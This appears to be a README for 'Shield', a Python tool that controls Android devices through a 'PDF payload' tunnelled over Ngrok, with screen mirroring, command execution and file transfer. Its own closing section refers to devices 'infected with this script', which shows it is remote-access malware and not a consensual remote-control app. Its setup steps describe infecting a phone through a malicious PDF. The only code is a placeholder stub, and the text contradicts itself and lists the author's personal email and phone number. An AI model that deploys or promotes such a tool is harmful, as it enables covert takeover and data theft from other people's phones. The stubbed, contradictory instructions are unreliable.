  


















###############################

Shield
Shield is a remote control application for Android devices. It allows you to control your Android device from your computer using a PDF payload.

Features:

Remote control your Android device from your computer
Mirror your Android device's screen to your computer
Send commands to your Android device
Upload files to your Android device
Download files from your Android device

Requirements:

Python 3
Ngrok
Adbutils
FFmpeg
Shield server (JAR file)
Getting started:

Install the required dependencies.
Start Ngrok and get your public URL.
Run the Shield client and pass in your PDF payload.
Connect to the Shield server using your public URL and port 5555.
Start the mirroring process.
Example:

python
import shield

pdf_payload = b"PDF payload"

client = shield.Shield(pdf_payload)
client.start()

Reporting the script:

If you believe that your Android device has been infected with this script, you should immediately take steps to remove it. You can do this by running a security scan on your device or by restoring your device to factory settings or better still, contact the Author of this script , Shiled via email(richmondrichmond183@gmail.com) or via phone(+237680425271) .

You should also be careful about what PDF files you open on your Android device. Only open PDF files from trusted sources. If you are unsure whether or not a PDF file is safe, you should not open it.
